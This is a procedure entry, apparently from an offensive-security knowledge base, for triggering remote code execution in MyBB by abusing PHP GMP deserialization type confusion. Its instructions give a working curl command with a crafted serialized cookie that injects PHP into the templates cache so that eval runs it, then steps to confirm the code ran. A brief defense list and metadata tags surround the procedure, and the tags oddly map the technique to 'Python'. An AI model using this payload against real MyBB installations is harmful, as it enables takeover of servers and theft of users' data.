---
id: proc-rce-trigger-001
tags:
  - rce
  - eval-injection
  - mybb
  - php
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/mybb-rce-curl-exploit]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Python]]'
updated_at: '2025-12-14T17:23:54.825Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Python]]'
---
# Trigger-RCE-via-MyBB-Index-Page-Access

## Summary

This procedure triggers the deserialization of the malicious cookie in MyBB, exploiting type confusion to modify the templates cache and execute arbitrary PHP code via eval.

## Description

Accessing index.php deserializes the cookie, runs __wakeup on the payload, converts GMP to integer ZVAL for object handle 5 (templates), updates cache.index with injected code, and evaluates it during template rendering in inc/class_templates.php get() method.

## Requirements

1. Malicious cookie already injected
2. Vulnerable MyBB and PHP setup
3. HTTP access to index.php

## Defense

Defensive measures and detection strategies:

- Patch PHP to 5.6.30+ or disable GMP
- Avoid eval in template systems; use safe rendering
- Log and alert on eval executions or cache modifications

## Objectives

1. Trigger deserialization and property update
2. Execute injected PHP code
3. Confirm RCE with output like phpinfo()

## Instructions

### Step 1: Access Index Page with Cookie

**Context**: Send request to trigger my_unserialize on the cookie.

Execute [[commands/mybb-rce-curl-exploit]]:

```bash
curl --cookie 'mybb[forumread]=a:1:{i:0;C:3:"GMP":106:{s:1:"5";a:2:{s:5:"cache";a:1:{s:5:"index";s:14:"{${phpinfo()}}";}i:0;O:12:"DateInterval":1:{s:1:"y";R:2;}}}}' http://127.0.0.1/mybb/
```

> Expected output: MyBB page with embedded phpinfo() output from eval.

### Step 2: Verify Execution

**Context**: Check response for signs of code execution.

Inspect output for PHP info table or custom injected code results.

> Success if arbitrary code runs without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Python]]

### Sub-Techniques


## Commands Used

- [[commands/mybb-rce-curl-exploit]]

## Tools Used

- [[tools/curl]]

## Tags

- rce
- eval-injection
- mybb
- php
